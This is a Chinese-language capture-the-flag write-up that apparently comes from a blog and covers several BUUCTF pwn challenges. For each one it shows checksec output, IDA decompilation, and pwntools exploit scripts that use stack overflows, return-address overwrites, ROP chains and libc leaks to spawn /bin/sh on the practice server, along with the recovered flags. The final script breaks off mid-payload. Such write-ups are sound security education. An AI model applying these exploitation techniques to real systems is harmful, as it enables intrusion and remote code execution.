编写`Python`脚本连接`node4.buuoj.cn`的监听端口`25860`，发送`payload`即可得到`flag{42086316-01d7-47ee-bfaa-00861bbe8222}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 25860)
payload = b'a'*(0x30 - 0x4) + p64(0x41348000)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/6.png)

------

### [ciscn_2019_n_8](https://buuoj.cn/challenges#ciscn_2019_n_8)

先`file ./ciscn_2019_n_8`查看文件类型再`checksec --file=./ciscn_2019_n_8`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_8/1.png)

用`IDA Pro 32bit`打开`ciscn_2019_n_8`后按`F5`反汇编，可以看到主函数源码如下：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp-14h] [ebp-20h]
  int v5; // [esp-10h] [ebp-1Ch]

  var[13] = 0;
  var[14] = 0;
  init();
  puts("What's your name?");
  __isoc99_scanf("%s", var, v4, v5);
  if ( *(_QWORD *)&var[13] )
  {
    if ( *(_QWORD *)&var[13] == 17LL )  //当var[13]的值等于0x11即17就能系统调用/bin/sh
      system("/bin/sh");
    else
      printf(
        "something wrong! val is %d",
        var[0],
        var[1],
        var[2],
        var[3],
        var[4],
        var[5],
        var[6],
        var[7],
        var[8],
        var[9],
        var[10],
        var[11],
        var[12],
        var[13],
        var[14]);
  }
  else
  {
    printf("%s, Welcome!\n", var);
    puts("Try do something~");
  }
  return 0;
}
```

构造`payload`时直接通过数组赋值用`13*4`个字节占满`var[0]`至`var[12]`，再把`var[13]`赋值为`0x11`，即可系统调用`/bin/sh`。

编写`Python`脚本连接`node4.buuoj.cn`的监听端口`29508`，发送`payload`即可得到`flag{f02dd738-d5ec-4e09-9b7f-68cf73aae00c}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 29508)
payload = b'a'*13*4 + p32(0x11)
io.sendlineafter(b'What\'s your name?\n', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_8/2.png)

------

### [pwn1_sctf_2016](https://buuoj.cn/challenges#pwn1_sctf_2016)

先`file ./pwn1_sctf_2016`查看文件类型再`checksec --file=pwn1_sctf_2016`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/1.png)

用`IDA Pro 32bit`打开`pwn1_sctf_2016`后按`F5`反汇编源码并查看主函数，发现`vuln()`函数。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/2.png)

双击`vuln()`函数查看源码，分析后发现`fgets()`函数限制输入`32`个字节到变量`s`中，乍一看并没有超出可用栈大小。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/3.png)

再按一次`F5`后发现第`19`行的`replace()`函数会把输入的`I`替换成`you`，`1`个字符变成`3`个字符，并且在第`27`行会对原来的`s`变量重新赋值。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/4.png)

在`Functions window`可以看到有一个`get_flag()`函数，按`F5`反汇编可以看到这是一个系统调用，且`get_flag()`函数的起始地址为`0x8048F0D`。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/5.png)

查看栈结构发现`s`的长度为`0x3c`，即`60`个字节，而输入被限制在`32`个字节内，每个`I`可以被替换成`you`，所以输入`60÷3=20`个`I`就能让栈溢出，然后`db 4 dup(?)` 还需要占用`4`个字节的内存，最后加上`get_flag()`函数的起始地址`0x8048F0D`构成`payload`。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/6.png)

编写`Python`脚本连接`node4.buuoj.cn`的监听端口`26333`，发送`payload`即可得到`flag{efb5872f-b8d0-4892-9ed3-ea71e8a7a983}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 26333)
e = ELF('pwn1_sctf_2016')
address = e.symbols['get_flag']
log.success('get_flag_address => %s' % hex(address).upper())
payload = b'I'*20 + b'a'*0x4 + p32(address)
# payload = b'I'*20 + b'a'*0x4 + p32(0x8048F0D)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/7.png)

------

### [jarvisoj_level0](https://buuoj.cn/challenges#jarvisoj_level0)

先`file ./level0`查看文件类型再`checksec --file=level0`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level0/1.png)

用`IDA Pro 64bit`打开`level0`后按`F5`反汇编源码并查看主函数，发现问题的关键在于`vulnerable_function()`函数。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level0/2.png)

双击`vulnerable_function()`函数可以看到`buf`的长度只有`0x80`，即可用栈大小只有`108`字节，但是`read()`并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level0/3.png)

在`Functions window`可以看到有一个`callsystem()`函数，按`F5`反汇编可以看到这是一个系统调用，且`callsystem()`函数的起始地址为`0x400596`。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level0/4.png)

编写`Python`脚本连接`node4.buuoj.cn`的监听端口`25719`，`buf`需覆盖`0x80`个字节覆盖，再加上`rbp`的`0x8`个字节，最后加上`callsystem()`函数的起始地址`0x400596`构成`payload`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 25719)
e = ELF('level0')
address = e.symbols['callsystem']
log.success('callsystem_address => {}'.format(hex(address).upper()))
payload = b'a'*(0x80 + 0x8) + p64(address)
# payload = b'a'*(0x80 + 0x8) + p64(0x400596)
io.sendline(payload)
io.interactive()
```

发送`payload`监听成功后`ls`查看文件目录再`cat flag`即可得到`flag{af006b52-6eb0-4df4-9706-dcbb4dc8cff2}`。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level0/5.png)

------

### [[HarekazeCTF2019]baby_rop](https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop)

先`file ./HarekazeCTF2019_babyrop1`查看文件类型再`checksec --file=./HarekazeCTF2019_babyrop1`检查文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/1.png) 

用`IDA Pro 64bit`打开附件`HarekazeCTF2019_babyrop1`，按`F5`反汇编源码并查看主函数，可以看到有个`char`型数组`v4`，`v4`的可用栈大小为`0x10`，`scanf()`函数读取输入到`v4`变量时并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/2.png)

双击`v4`变量查看其在当前函数栈帧的详情，构造`payload`时可以用`0x10`个字节占满变量`v4`，再用`0x8`个字节覆盖到栈帧。

![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/3.png)

在`64`位程序中，函数的前`6`个参数是通过寄存器传递的，分别是`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`(当参数小于`7`时)，所以我们需要用`ROPgadget`找到`pop_rdi`的地址。

```bash
ROPgadget --binary ./HarekazeCTF2019_babyrop1 --only "pop|ret"
```

![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/4.png)

在`Function window`中存在`system()`函数的地址，我们也可以通过`ELF`模块的`symbols['system']`来获取`system()`函数的地址。字符串`/bin/sh`的地址可以通过`ROPgadget`获取。

```bash
ROPgadget --binary ./HarekazeCTF2019_babyrop1 --string "/bin/sh"
```

![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/5.png)

构造`payload`时向`pop_rdi`寄存器中传入字符串`/bin/sh`的地址，再调用`system`即可完成系统调用，编写`Python`代码打通靶机获取到目标主机的`shell`后输入`cat /home/babyrop/flag`即可得到`flag{5113e012-2d92-4257-bf3a-f688df2841bf}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 28730)
e = ELF('./HarekazeCTF2019_babyrop1')
# ROPgadget --binary ./HarekazeCTF2019_babyrop1 --only "pop|ret"
pop_rdi = 0x400683
system_address = e.symbols['system'] # 0x400490
# ROPgadget --binary ./HarekazeCTF2019_babyrop1 --string "/bin/sh"
bin_sh_address = 0x601048
payload = b'a'*0x10 + b'fuckpwn!'
payload += flat(pop_rdi, bin_sh_address, system_address)
io.sendlineafter(b'What\'s your name? ', payload)
io.interactive()  # cat /home/babyrop flag
```

![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/6.png)

------

### [HarekazeCTF2019]baby_rop2

先`file ./HarekazeCTF2019_babyrop2`查看文件类型，再`checksec --file=./HarekazeCTF2019_babyrop2`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./HarekazeCTF2019_babyrop2
./HarekazeCTF2019_babyrop2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=fab931b976ae2ff40aa1f5d1926518a0a31a8fd7, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./HarekazeCTF2019_babyrop2
[*] '/home/tyd/ctf/pwn/buuctf/HarekazeCTF2019_babyrop2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开附件`HarekazeCTF2019_babyrop2`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[28]; // [rsp+0h] [rbp-20h] BYREF
  int v5; // [rsp+1Ch] [rbp-4h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  printf("What's your name? ");
  v5 = read(0, buf, 0x100uLL);
  buf[v5 - 1] = 0;
  printf("Welcome to the Pwn World again, %s!\n", buf);
  return 0;
}
```

这题和[**[HarekazeCTF2019]baby_rop**](#[HarekazeCTF2019]baby_rop)的区别就在于，程序中没有现成的`system`和`/bin/sh`可以利用。我们需要利用`printf`函数来计算出`libc`的基地址，以便求出`system`和`/bin/sh`。在`64`位程序中，函数的前`6`个参数是通过寄存器传递的，分别是`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`(当参数小于`7`时)，所以我们需要用`ROPgadget`找到`pop_rdi`的地址。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ ROPgadget --binary ./HarekazeCTF2019_babyrop2 --only "pop|ret"
Gadgets information
============================================================
0x000000000040072c : pop r12 ; pop r13 ; pp r14 ; pop r15 ; ret
0x000000000040072e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400730 : pop r14 ; pop r15 ; ret
0x0000000000400732 : pop r15 ; ret
0x000000000040072b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040072f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004005a0 : pop rbp ; ret
0x0000000000400733 : pop rdi ; ret
0x0000000000400731 : pop rsi ; pop r15 ; ret
0x000000000040072d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004d1 : ret
0x0000000000400532 : ret 0x200a

Unique gadgets found: 12
```

编写`Python`代码求解，`cat /home/babyrop2/flag`得到`flag{ca63fb55-fa76-4655-994d-6bca048f1748}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27378)
elf = ELF('./HarekazeCTF2019_babyrop2')
main = elf.sym['main']
printf_plt = elf.plt['printf']
read_got = elf.got['read']
rdi_ret = 0x400733 # pop rdi ; ret
offset = 0x20 + 0x8
payload = b'a'*offset + flat(rdi_ret, read_got, printf_plt, main)
io.sendlineafter(b"What's your name? ", payload)
read_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
log.info('read_address => %s', hex(read_addr))
libc = ELF('./libc.so.6')
libcbase = read_addr-libc.sym['read']
log.info('libc_address => %s', hex(libcbase))
system = libcbase + libc.sym['system']
log.info('system_address => %s', hex(system))
bin_sh = libcbase + libc.search(b'/bin/sh').__next__()
log.info('bin_sh_address => %s', hex(bin_sh))
payload = b'a'*offset + p64(rdi_ret) + p64(bin_sh) + p64(system)
io.sendlineafter(b"What's your name? ", payload)
io.interactive() # cat /home/babyrop2/flag
```

看`Write Up`的时候发现有些师傅利用格式化字符串，构造出`printf("%s", read_got)`泄露`read`函数的`got`表地址。`%s`的地址为`0x400770`。`p64(rdi_ret)+p64(format_str)`将`b'a'*offset`造成栈溢出后的返回地址覆盖为`pop_rdi; ret`，`pop_rdi`对应参数为`format_str`，执行后将`format_str`赋值给`rdi`，之后执行`ret`返回指令。`p64(pop_rsi)+p64(read_got)+p64(0)`是上个`ret`要执行的，将`rsi`寄存器的值设置成`read`函数的`got`表地址，用不着`r15`就设置为`0`。`pop_rsi`的`ret`返回到`p64(printf_plt)`，利用`printf`函数输出`read`函数的`got`表地址。在获得`read`函数的`got`表地址后，我们需要用`p64(main)`回到程序开头。

```assembly
.rodata:0000000000400758 ; const char format[]
.rodata:0000000000400758 format          db 'What',27h,'s your name? ',0
.rodata:0000000000400758                                         ; DATA XREF: main+44↑o
.rodata:000000000040076B                 align 10h
.rodata:0000000000400770 ; const char aWelcomeToThePw[]
.rodata:0000000000400770 aWelcomeToThePw db 'Welcome to the Pwn World again, %s!',0Ah,0
.rodata:0000000000400770                                         ; DATA XREF: main+80↑o
.rodata:0000000000400770 _rodata         ends
```

编写`Python`代码求解，`cat /home/babyrop2/flag`得到`flag{ca63fb55-fa76-4655-994d-6bca048f1748}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27378)
elf = ELF('./HarekazeCTF2019_babyrop2')
main = elf.sym['main']
printf_plt = elf.plt['printf']
read_got = elf.got['read']
rdi_ret = 0x400733 # pop rdi ; ret
pop_rsi = 0x400731 # pop rsi ; pop r15 ; ret
format_str = 0x400770
offset = 0x20 + 0x8
payload = b'a'*offset + flat(rdi_ret, format_str, pop_rsi, read_got, 0, printf_plt, main)
io.sendlineafter(b"What's your name? ", payload)
read_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
log.info('read_address => %s', hex(read_addr))
libc = ELF('./libc.so.6')
libcbase = read_addr-libc.sym['read']
log.info('libc_address => %s', hex(libcbase))
system = libcbase + libc.sym['system']
log.info('system_address => %s', hex(system))
bin_sh = libcbase + libc.search(b'/bin/sh').__next__()
log.info('bin_sh_address => %s', hex(bin_sh))
payload = b'a'*offset + p64(rdi_ret) + p64(bin_sh) + p64(system)
io.sendlineafter(b"What's your name? ", payload)
io.interactive() # cat /home/babyrop2/flag
```

------

### [jarvisoj_tell_me_something](https://buuoj.cn/challenges#jarvisoj_tell_me_something)

先`file ./jarvisoj_tell_me_something`查看文件类型再`checksec --file=./jarvisoj_tell_me_something`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_tell_me_something/1.png)

用`IDA Pro 64bit`打开附件`jarvisoj_tell_me_something`，按`F5`反汇编源码并查看主函数，可以看到有个`int`型变量`v4`，`v4`的可用栈大小为`0x88`，`read()`函数读取输入到`v4`变量时限制的字节数为`0x100`，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_tell_me_something/2.png)

在`Function window`中存在后门函数`good_game()`，这个函数读取了服务器中的`flag.txt`文件并进行输出。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_tell_me_something/3.png)

构造`payload`时只要我们用`0x88`个字节覆盖掉`v4`变量，造成栈溢出漏洞，再将函数栈帧的返回地址覆盖成后门函数`good_game()`的地址就能拿到`flag`啦。编写`Python`代码即可得到`flag{5325d99b-666c-48e3-bd0c-be4fdd6619d4}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29608)
e = ELF('./jarvisoj_tell_me_something')
good_game = e.symbols['good_game']
payload = b'a'*0x88 + p64(good_game)
io.sendlineafter(b'Input your message:\n', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_tell_me_something/4.png)

------

### [护网杯_2018_gettingstart](https://buuoj.cn/challenges#%E6%8A%A4%E7%BD%91%E6%9D%AF_2018_gettingstart)

先`file ./2018_gettingstart`查看文件类型再`checksec --file=2018_gettingstart`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/1.png)

用`IDA Pro 64bit`打开附件`2018_gettingstart`，按`F5`反汇编源码并查看主函数，可以看到有个`char`型数组`buf`，`buf`的可用栈大小为`0x30`，`read()`函数读取输入到`buf`变量时限制的字节数为`0x28`，并不能构成栈溢出。

注意到当`v5 == 0x7FFFFFFFFFFFFFFFLL && v6 == 0.1`这个条件成立时就会发生系统调用`system('/bin/sh')`。

![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/2.png)

分别双击`v5`和`v6`可以看到其在栈中的位置，构造`payload`时只需要将`v5`和`v6`重新赋值即可让主函数中的`if`条件成立。

![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/3.png)

`v5`的赋值直接就是`0x7FFFFFFFFFFFFFFF`，那么`v6 == 0.1`该怎么样用`16`进制数表示呢？可以在这个网站https://www.binaryconvert.com/result_double.html查看`0.1`用`IEEE754`双精度浮点数中的二进制格式。

![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/4.png)

当然也能在汇编源码中看到`ucomisd xmm0, cs:qword_C10`，双击`qword_C10`就能知道`0.1`在内存中的数值`0x3FB999999999999A`。

![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/5.png)

编写`Python`代码即可得到`flag{5113e012-2d92-4257-bf3a-f688df2841bf}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27036)
# io = process('./2018_gettingStart')
payload = b'a'*0x18 + p64(0x7FFFFFFFFFFFFFFF) + p64(0x3FB999999999999A)
io.sendlineafter(b'But Whether it starts depends on you.\n', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/6.png)

------

### [bjdctf_2020_babystack](https://buuoj.cn/challenges#bjdctf_2020_babystack)

先`file ./bjdctf_2020_babystack`查看文件类型再`checksec --file=bjdctf_2020_babystack`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babystack/1.png)

用`IDA Pro 64bit`打开附件`bjdctf_2020_babystack`，按`F5`反汇编源码并查看主函数，发现该函数中有个`buf`变量是`char`型数组，`buf`的长度只有`0x10`，`read()`函数虽然限制了输入到`buf`变量的字节数但是该字节数是由用户输入的`nbytes`变量决定的，当`nbytes`变量是一个足够大的数值时，显然会造成栈溢出。

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babystack/2.png)

双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x10`个字节占满`buf`变量，然后再加上`r`的`8`个字节。

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babystack/3.png)

在`Function Window`中注意到有一个名为`backdoor()`的函数，函数返回值直接是系统调用，因此构造`payload`时需要再加上这个`backdoor()`函数的起始地址即可。

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babystack/4.png)

编写`Python`代码即可得到`flag{0e0d405b-c936-45c4-afc4-947afc46b0a3}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
# io = process('./bjdctf_2020_babystack')
io = remote('node4.buuoj.cn', 29417)
e = ELF('./bjdctf_2020_babystack')
io.sendlineafter(b'Please input the length of your name:', b'100')
backdoor_address = e.symbols['backdoor'] # 0x4006E6
log.success('backdoor_address => %s' % hex(backdoor_address))
payload = b'a'*0x10 + b'fuckpwn!' + p64(backdoor_address)
io.sendlineafter(b'What\'s u name?', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babystack/5.png)

------

### [bjdctf_2020_babyrop](https://buuoj.cn/challenges#bjdctf_2020_babyrop)

先`file ./bjdctf_2020_babyrop`查看文件类型再`checksec --file=bjdctf_2020_babyrop`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babyrop/1.png)

用`IDA Pro 64bit`打开附件`bjdctf_2020_babyrop`，按`F5`反汇编源码并查看主函数，发现`vuln()`函数很可疑。

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babyrop/2.png)

双击发现`vuln()`函数，发现该函数中有个`buf`变量是`char`型数组，`buf`的长度只有`0x20`，`read()`函数限制输入到`buf`变量的字节数为`0x64`，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babyrop/3.png)

双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x20`个字节占满`buf`变量，然后再加上`r`的`8`个字节。

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babyrop/4.png)

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并通过`puts()`函数泄露`puts()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`puts()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。

在`64`位程序中，函数的前`6`个参数是通过寄存器传递的，分别是`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`(当参数小于`7`时)，所以我们需要用`ROPgadget`找到`pop_rdi`和`pop_ret`的地址。

```python
ROPgadget --binary ./bjdctf_2020_babyrop --only "pop|ret"
```

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babyrop/5.png)

编写`Python`代码即可得到`flag{aed7af27-c195-4e84-824f-263dc8fb04df}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 28823)
e = ELF('bjdctf_2020_babyrop')
puts_plt = e.plt['puts']
log.success('puts_plt => %s' % hex(puts_plt))
puts_got = e.got['puts']
log.success('puts_got => %s' % hex(puts_got))
main_address = e.symbols['main']
log.success('main_address => %s' % hex(main_address))
pop_rdi = 0x400733 # ROPgadget --binary ./bjdctf_2020_babyrop --only "pop|ret"
payload = b'a'*0x20 + b'fuckpwn!' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_address)
io.sendlineafter(b'Pull up your sword and tell me u story!\n', payload)
puts_address = u64(io.recvline().strip(b'\n').ljust(8, b'\x00'))
log.success('puts_address => %s' % hex(puts_address))
libc = LibcSearcher('puts', puts_address) # 获取libc版本, libc6_2.23-0ubuntu11_amd64
libcbase = puts_address - libc.dump('puts') # libc的基址=puts()函数地址-puts()函数偏移地址
log.success('libcbase_address => %s' % hex(libcbase))
system_address = libcbase + libc.dump('system') # system()函数的地址=libc的基址+system()函数偏移地址
log.success('system_address => %s' % hex(system_address))
bin_sh_address = libcbase + libc.dump('str_bin_sh') # '/bin/sh'的地址=libc的基址+'/bin/sh'偏移地址
log.success('bin_sh_address => %s' % hex(bin_sh_address))
pop_ret = 0x4004c9 # ROPgadget --binary ./bjdctf_2020_babyrop --only "pop|ret"
payload = b'a'*0x20 + b'fuckpwn!' + p64(pop_ret) + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
io.sendlineafter(b'Pull up your sword and tell me u story!\n', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babyrop/6.png)

------

------

### [铁人三项(第五赛区)_2018_rop](https://buuoj.cn/challenges#%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9(%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA)_2018_rop)

先`file ./2018_rop`查看文件类型再`checksec --file=2018_rop`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/2018_rop/1.png)

用`IDA Pro 32bit`打开附件`2018_rop`，按`F5`反汇编源码并查看主函数，双击`be_nice_to_people()`函数查看详情并没有发现什么，

![](https://paper.tanyaodan.com/BUUCTF/2018_rop/2.png)

双击`vulnerable_function()`函数，发现该函数中有个`buf`变量是`char`型数组，`buf`的长度只有`0x88`，`read()`函数限制了输入到`buf`变量的字节数为`0x100`，显然存在栈溢出漏洞。构造`payload`时先用`0x88`个字节占满`buf`变量，再加上`4`个字节覆盖到返回地址。

![](https://paper.tanyaodan.com/BUUCTF/2018_rop/3.png)

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`write()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`write()`函数的`plt`表和`got`表地址，进行栈溢出并通过`write()`函数泄露`write()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`write()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。

其中`write()`函数原型如下：

```c
ssize_t write(int fd, const void*buf, size_t count);
// write()会把参数buf所指的内存写入count个字节到参数fd所指的文件内。
// fd:是文件描述符（write所对应的是写，即就是1）
// buf:通常是一个字符串，需要写入的字符串
// count：是每次写入的字节数
```

编写`Python`代码即可得到`flag{f3efd9be-b4a5-4fd3-9446-49c300eaf93c}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29081)
e = ELF('./2018_rop')
write_plt = e.plt['write']
log.success('write_plt => %s' % hex(write_plt))
write_got = e.got['write']
log.success('write_got => %s' % hex(write_got))
main_address = e.symbols['main']
log.success('main_address => %s' % hex(main_address))
payload = b'a'*0x88 + b'fuck' + p32(write_plt) + p32(main_address) # 栈溢出，返回地址填写write()函数在plt表中的地址，并加上main()函数地址以再次执行程序
payload += p32(0) + p32(write_got) + p32(4) # write()函数的参数
io.sendline(payload)
write_address = u32(io.recv(4))
log.success('write_address => %s' % hex(write_address))
libc = LibcSearcher('write', write_address) # 获取libc版本, libc6-i386_2.27-3ubuntu1_amd64
libcbase = write_address - libc.dump('write')
log.success('libcbase_address => %s' % hex(libcbase))
system_address = libcbase + libc.dump('system')
log.success('system_address => %s' % hex(system_address))
bin_sh_address = libcbase + libc.dump('str_bin_sh')
log.success('bin_sh_address => %s' % hex(bin_sh_address))
payload = b'a'*0x88 + b'fuck' + p32(system_address) + p32(0xdeadbeef) + p32(bin_sh_address)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/2018_rop/4.png)

------

### [[OGeek2019]babyrop](https://buuoj.cn/challenges#[OGeek2019]babyrop)

先`file ./babyrop`查看文件类型再`checksec --file=./babyrop`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/1.png)

用`IDA Pro 32bit`打开附件`babyrop`，按`F5`反汇编源码并查看主函数，可以看到将一个随机数赋值给了`buf`变量。

![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/2.png)

双击`sub_80486BB()`函数查看详情发现这是一个初始化缓存区的函数。

![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/3.png)

双击`sub_804871F()`函数查看详情，发现传入的参数`a1`被格式化字符串后赋值给了变量`s`。`v1`变量用于获取`char`型数组`buf`的大小，`strncmp()`函数用于比较用户输入的数和随机数的大小，构造`payload`时可以先用`\x00`来绕过`strncmp()`，因为`strlen()`遇到`\x00`时便会停止获取长度。

![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/4.png)

双击`sub_80487D0()`函数查看详情，发现该函数声明了一个`char`型数组的局部变量`buf`，可用栈大小为`0xe7`。如果`a1`等于`127`则会读入`0xc8`个字节到变量`buf`并不会导致栈溢出，但是当`a1`大于`0xe7`时就会读入`a1`个字节到变量`buf`从而造成栈溢出漏洞。因为`a1`是函数`sub_804871F()`的返回值，所以构造`payload`时让`a1`的值大于`\xe7`就可以导致栈溢出啦。

![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/5.png)

总的来说这题的思路就是：构造`payload`时先用`\x00`使得`v1`通过`strlen()`获取的返回值为0，从而绕过`strncmp()`的比较，此外`sub_804871F()`函数的返回值要尽可能大，所以`v5`读取输入时可以赋值为`\x00\xff\xff\xff\xff\xff\xff\xff`，这样函数返回值在传入`sub_80487D0()`函数时才能构造栈溢出漏洞。

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是需要注意到主函数中有`write()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的内存地址。因此我们可以用`ELF`来获取`write()`函数的`plt`表和`got`表地址，利用栈溢出漏洞并通过`read()`函数泄露`write()`函数在`got`表中的内存地址`write_address`。接着我们需要用到题目给出的`libc-2.23.so`，根据`libc`中`write()`函数的偏移地址可以计算出该`libc`的基址地址`libcbase`，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址可以计算出这俩个函数的内存地址，最后利用栈溢出漏洞来完成系统调用`system('/bin/sh')`，输入`cat flag`后即可拿到`flag`。

编写`Python`代码即可得到`flag{2c99881a-89e7-41c6-83a1-7a0e3781f961}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 25522)
# io = process('./babyrop')
e = ELF('./babyrop')
io.sendline(b'\x00'.ljust(8, b'\xff'))
write_plt = e.plt['write']
write_got = e.got['write']
main_address = 0x8048825
payload = b'a'*0xe7 + b'pwn!'
